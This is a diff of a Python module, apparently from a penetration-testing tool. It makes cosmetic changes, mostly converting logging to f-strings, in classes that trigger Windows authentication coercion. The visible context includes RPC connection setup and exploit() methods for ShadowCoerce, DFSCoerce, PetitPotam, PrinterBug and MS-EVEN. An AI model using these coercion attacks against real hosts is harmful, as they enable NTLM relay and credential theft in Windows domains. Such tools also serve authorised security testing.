@@ -233,14 +233,13 @@ class ShadowCoerceTrigger:
 
         if doKerberos:
             rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
-        # if target:
 
         rpctransport.setRemoteHost(target)
         dce = rpctransport.get_dce_rpc()
         if doKerberos:
             dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
         dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
-        self.context.log.debug("Connecting to {}".format(binding_params[pipe]["stringBinding"]))
+        self.context.log.debug(f"Connecting to {format(binding_params[pipe]['stringBinding'])}")
         try:
             dce.connect()
         except Exception as e:
@@ -358,7 +357,7 @@ class DFSCoerceTrigger:
         dce = rpctransport.get_dce_rpc()
         if doKerberos:
             dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
-        self.context.log.debug("Connecting to {}".format(binding_params[pipe]["stringBinding"]))
+        self.context.log.debug(f"Connecting to {format(binding_params[pipe]['stringBinding'])}")
         try:
             dce.connect()
         except Exception as e:
@@ -373,11 +372,10 @@ class DFSCoerceTrigger:
         return dce
 
     def exploit(self, dce, listener, always_continue, pipe):
-
         self.context.log.debug("Sending NetrDfsAddStdRootForced!")
         try:
             request = NetrDfsAddStdRootForced()
-            """    NET_API_STATUS NetrDfsAddStdRootForced(
+            """ NET_API_STATUS NetrDfsAddStdRootForced(
                     [in, string] WCHAR* ServerName,
                     [in, string] WCHAR* RootShare,
                     [in, string] WCHAR* Comment,
@@ -587,7 +585,7 @@ class PetitPotamtTrigger:
         if doKerberos:
             dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
         dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
-        self.context.log.debug("Connecting to {}".format(binding_params[pipe]["stringBinding"]))
+        self.context.log.debug(f"Connecting to {format(binding_params[pipe]['stringBinding'])}")
         try:
             dce.connect()
         except Exception as e:
@@ -602,7 +600,6 @@ class PetitPotamtTrigger:
         return dce
 
     def exploit(self, dce, listener, always_continue, pipe):
-
         self.context.log.debug("Sending EfsRpcAddUsersToFile!")
         try:
             request = EfsRpcAddUsersToFile()
@@ -822,7 +819,7 @@ class PrinterBugTrigger:
         if doKerberos:
             dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
         dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
-        self.context.log.debug("Connecting to {}".format(binding_params[pipe]["stringBinding"]))
+        self.context.log.debug(f"Connecting to {format(binding_params[pipe]['stringBinding'])}")
         try:
             dce.connect()
         except Exception as e:
@@ -837,7 +834,6 @@ class PrinterBugTrigger:
         return dce
 
     def exploit(self, dce, listener, target, always_continue, pipe):
-
         try:
             resp = rprn.hRpcOpenPrinter(dce, "\\\\%s\x00" % target)
         except Exception as e:
@@ -937,7 +933,7 @@ class MSEvenTrigger:
         if doKerberos:
             dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
         dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
-        self.context.log.debug("Connecting to {}".format(binding_params[pipe]["stringBinding"]))
+        self.context.log.debug(f"Connecting to {format(binding_params[pipe]['stringBinding'])}")
         try:
             dce.connect()
         except Exception as e:
@@ -952,7 +948,6 @@ class MSEvenTrigger:
         return dce
 
     def exploit(self, dce, listener, always_continue, pipe):
-
         self.context.log.debug("Sending ElfrOpenBELW!")
         try:
             request = even.ElfrOpenBELW()
